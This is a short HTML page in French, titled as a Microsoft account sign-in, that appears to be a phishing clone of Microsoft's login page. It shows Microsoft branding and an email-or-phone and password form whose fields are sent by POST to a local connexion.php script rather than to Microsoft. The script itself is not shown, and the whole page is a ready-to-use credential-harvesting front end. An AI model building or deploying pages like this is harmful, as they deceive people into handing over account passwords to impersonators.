<html lang="fr">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Se Connecter à votre compte Microsoft</title>
    <link rel="stylesheet" href="css/style.css" />
    <link rel="icon" type="image/png" sizes="25x25" href="img/logo.png" />
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet" />
</head>

<body>
    <form method="POST" action="connexion.php">

        <img src="img/microsoft.jpg"><br /><br />

        <div class="corps-formulaire">
            <div class="gauche">
                <div class="text-title">
                    <label>Sign in</label>
                </div> <br />
                <div class="corps-formulaire">
                    <div class="gauche">
                        <div class="user-box">
                            <input type="text" name="email" class="login-input" placeholder="E-mail, téléphone ou Skype" required autofocus />
                            <input type="password" name="password" class="login-input" placeholder="Mot de passe" required />
                            <label class="checkbox">
                                <input type="checkbox" value="remember-me" id="rememberMe" name="rememberMe"> Se souvenir de moi
                            </label><br /><br />
                            <a href="#" class="nav-item ml-auto">Mot de passe oublié ?</a>
                        </div>

                    </div>
                </div>

                <div class="pied-formulaire" align="center">
                    <button name="connexion">Envoyer</button>
                </div>
                
    </form>
</body>

</html>